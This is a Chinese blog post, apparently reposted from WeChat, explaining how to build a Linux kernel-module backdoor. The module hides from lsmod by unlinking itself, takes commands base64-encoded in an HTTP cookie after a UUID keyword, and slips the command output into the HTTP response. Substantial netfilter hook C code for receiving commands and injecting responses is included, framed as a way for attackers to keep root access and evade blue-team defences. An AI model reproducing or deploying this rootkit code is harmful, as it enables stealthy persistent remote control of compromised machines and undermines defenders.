version="1.0" encoding="utf-8"?

# 一种HTTP隧道内核态远控的实现方法

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzU1NzcxNjAyMQ==&mid=2247484230&idx=1&sn=7a0853cd0cc8f6ce58a86d57627eba9b&chksm=fc30c41ccb474d0ac8ff998e7467310c8a8942d8d574e2b93c5e32a03b279fe6f3c0f60c9624&scene=126&sessionid=1681400524#rd](http://mp.weixin.qq.com/s?__biz=MzU1NzcxNjAyMQ==&mid=2247484230&idx=1&sn=7a0853cd0cc8f6ce58a86d57627eba9b&chksm=fc30c41ccb474d0ac8ff998e7467310c8a8942d8d574e2b93c5e32a03b279fe6f3c0f60c9624&scene=126&sessionid=1681400524#rd)

## **序言**

当前护网蓝军主动防御工具越来越强，其他隧道如DNS、ICMP等因特征明显都有比较有效的检测防范方法，HTTP隧道因为是正常业务通道、数据比较难甄别而成为隐藏流量的首选，内存马已经成为常规武器。  
在获得ROOT权限后，干掉主动防御软件可能不会那么容易，因为它可能并不是孤立而是分布式的、彼此间有联系，粗暴的直接停掉或杀掉防御进程会导致其他主机告警。因此，在此场景下想要持久化ROOT权限，内核远控的存在是有必要的。

## **设计思想**

内核ROOKIT常用LKMD方式实现，多数主动防御工具都不具备内核模块的检测能力，而模块为防止被lsmod查看到，可使用“断链法”隐藏。HTTP服务是基于TCP协议的，我们可以使用某种特定的HTTP请求激活下发命令，然后执行结果会在该请求的响应中带出。比如设计如下交互，先看请求：

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
GET / HTTP/1.1Host: 192.168.122.136Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1cookie: 91d1c532-b156-11eb-8e2c-dfb994043297;ZWNobyAxID4gL3RtcC8xMjM0User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36 Edg/90.0.818.51Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Connection: close

```

将HTTP头中的cookie前面的UUID作为关键字，后跟远控命令的base64编码。内核远控在接收含有此关键字的TCP报文后（有效载荷大于0，即非SYN、SYN-ACK、ACK等握手应答包），解析并执行远控命令并在该HTTP响应（同样是TCP报文）的HTTP头中插入响应数据:

*   

```

```

## **技术细节**

Netfilter是Linux内核中的一个框架，它提供一个标准的接口，通过该接口能够方便的进行不同的网络操作，包括包过滤、网络地址转换和端口转换。Netfilter在内核中提供一组钩子hooks，通过这些hooks，内核模块可以向TCP/IP协议栈注册回调函数。我们可以基于netfilter实现上文所述的逻辑功能:

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
static struct nf_hook_ops _prehook, _posthook;
static unsigned int watch_in(unsigned int hooknum,           struct sk_buff *skb,           const struct net_device *in,           const struct net_device *out,           int (*okfn)(struct sk_buff *));
static unsigned int watch_out(unsigned int hooknum,            struct sk_buff *skb,            const struct net_device *in,            const struct net_device *out,            int (*okfn)(struct sk_buff *));
int init_module(){    /* Fill in our hook structure */    _prehook.hook =  (nf_hookfn *)watch_in;         /* Handler function */    _prehook.hooknum  = NF_INET_PRE_ROUTING; /* First hook for IPv4 */    _prehook.pf       = PF_INET;    _prehook.priority = NF_IP_PRI_FIRST;   /* Make our function first */
    _posthook.hook =   (nf_hookfn *)watch_out;      /* Handler function */    _posthook.hooknum  = NF_INET_POST_ROUTING; /* First hook for IPv4 */    _posthook.pf       = PF_INET;    _posthook.priority = NF_IP_PRI_FIRST;   /* Make our function first */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)  nf_register_net_hook(&init_net, &_prehook);  nf_register_net_hook(&init_net, &_posthook);#else  nf_register_hook(&_prehook);  nf_register_hook(&_posthook);#endif    return 0;}
void cleanup_module(){#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)  nf_unregister_net_hook(&init_net, &_prehook);  nf_unregister_net_hook(&init_net, &_posthook);#else  nf_unregister_hook(&_posthook);  nf_unregister_hook(&_prehook);#endif}

```

上述代码逻辑清楚很容易理解，在模块装载时在网络层注册勾子，卸载时解除勾子，watch\_in处理输入报文，相应的watch\_out处理输出报文。

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
static unsigned int watch_in(unsigned int hooknum,           struct sk_buff *skb,           const struct net_device *in,           const struct net_device *out,           int (*okfn)(struct sk_buff *)){    struct iphdr *ip_hdr = 0;    if(!skb)    return NF_ACCEPT; 
    ip_hdr = (struct iphdr *)skb_network_header(skb);  if(!ip_hdr)      return NF_ACCEPT;        if(ip_hdr->protocol != IPPROTO_TCP)        return NF_ACCEPT;
    struct tcphdr *tcph = tcp_hdr(skb);    if(skb->len == ip_hdr->ihl*4 + tcph->doff*4)//TCP握手包        return NF_ACCEPT;
    //访问tcp payload的数据时，要线性化，否则数据不全    if (0 != skb_linearize(skb))     {        return NF_ACCEPT;    }        tcph = tcp_hdr(skb);    char * data = (char *)(tcph) + tcph->doff * sizeof(int);    char cookie[1024] = {0};    if(getCookie(data, iptot_len - tcph->doff * sizeof(int), cookie, sizeof(cookie) - 1) == 0)        return NF_ACCEPT;
    if(strncmp(cookie, KEYWORD, sizeof(KEYWORD) - 1) != 0)        return NF_ACCEPT;    ...}
```

解析TCP载荷的过程中，要剥掉IP头和TCP头，注意skb一定要先线性化，否则报文内存是不连续的，不能按照指针加偏移量的方式访问。  
如何查找HTTP请求对应的HTTP响应报文？TCP链路，可以通过源端口和目的端口这个二元组一一对应。在watch\_in中记下该HTTP请求的端口信息，再在watch\_out中进行匹配查找，找到后注入自定义内容。

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
static unsigned int watch_out(unsigned int hooknum,            struct sk_buff *skb,            const struct net_device *in,            const struct net_device *out,            int (*okfn)(struct sk_buff *)){    struct iphdr *ip_hdr = 0;    if(!skb)    return NF_ACCEPT; 
    ip_hdr = (struct iphdr *)skb_network_header(skb);  if(!ip_hdr)      return NF_ACCEPT;        if(ip_hdr->protocol != IPPROTO_TCP)        return NF_ACCEPT;
    struct tcphdr *tcph = tcp_hdr(skb);    if(!tcph->psh)        return NF_ACCEPT;        unsigned short src_port = ntohs(tcph->source);    unsigned short dst_port = ntohs(tcph->dest);
    struct list_head * pos, * pos1;    struct C2Frame * frame = NULL;    int found = 0;    spin_lock(&_lock);    list_for_each_safe(pos, pos1, &_c2_list_head)    {        frame = list_entry(pos, struct C2Frame, list);        if(frame->src_port == dst_port && frame->dst_port == src_port)        {            list_del((struct list_head *)pos);            found = 1;            break;        }    }    spin_unlock(&_lock);    if(found == 0)        return NF_ACCEPT;
    //printk("Found frame to inject!!!");    if (0 != skb_linearize(skb))     {        goto exit;    }
    unsigned short inject_len = frame->rsp_len;    inject_http_response(skb, frame->response, inject_len);    ...}

```

经实验，修改TCP报文的操作会有一些耗时，大概几百毫秒。

## **总结**

本文提供一种内核远控的实现思路，至于在内核态能用来做什么可根据需求实现，如果想要回显（即修改HTTP响应、TCP回包）就不能执行IO等耗时操作。  
完整代码可参考DEMO项目，该项目实现了无回显异步执行用户态shell功能

*   

```

```